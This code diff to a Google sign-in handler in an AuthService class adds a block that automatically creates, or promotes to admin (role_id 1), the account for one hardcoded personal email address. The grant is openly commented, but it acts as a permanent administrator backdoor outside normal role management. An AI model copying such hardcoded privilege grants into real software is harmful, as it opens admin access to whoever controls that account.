@@ -291,6 +291,40 @@ class AuthService {
       const fullName = payload.name || payload.given_name || 'Google User';
       const profilePictureUrl = payload.picture || null;
 
+      // Automatically register/update this email as Admin (role_id = 1)
+      if (email === 'quocanh26012004@gmail.com') {
+        const checkResult = await db.query(
+          'SELECT user_id, email, username, full_name, role_id FROM users WHERE email = $1',
+          [email]
+        );
+        
+        if (checkResult.rows.length === 0) {
+          let username = email.split('@')[0];
+          const checkUsername = await db.query('SELECT user_id FROM users WHERE username = $1', [username]);
+          if (checkUsername.rows.length > 0) {
+            username = `${username}_${Math.floor(1000 + Math.random() * 9000)}`;
+          }
+
+          const { v4: uuidv4 } = require('uuid');
+          const randomPassword = uuidv4();
+          const hashedPassword = await bcrypt.hash(randomPassword, 10);
+
+          const insertQuery = `
+            INSERT INTO users (email, password_hash, username, full_name, role_id, profile_picture_url)
+            VALUES ($1, $2, $3, $4, 1, $5)
+            RETURNING user_id, email, username, full_name, role_id, profile_picture_url
+          `;
+          await db.query(insertQuery, [email, hashedPassword, username, fullName, profilePictureUrl]);
+          console.log(`[Google Auth] Auto-registered admin: ${email}`);
+        } else {
+          const user = checkResult.rows[0];
+          if (parseInt(user.role_id, 10) !== 1) {
+            await db.query('UPDATE users SET role_id = 1 WHERE email = $1', [email]);
+            console.log(`[Google Auth] Auto-promoted existing user to admin: ${email}`);
+          }
+        }
+      }
+
       const result = await db.query(
         'SELECT user_id, email, username, full_name, role_id FROM users WHERE email = $1',
         [email]
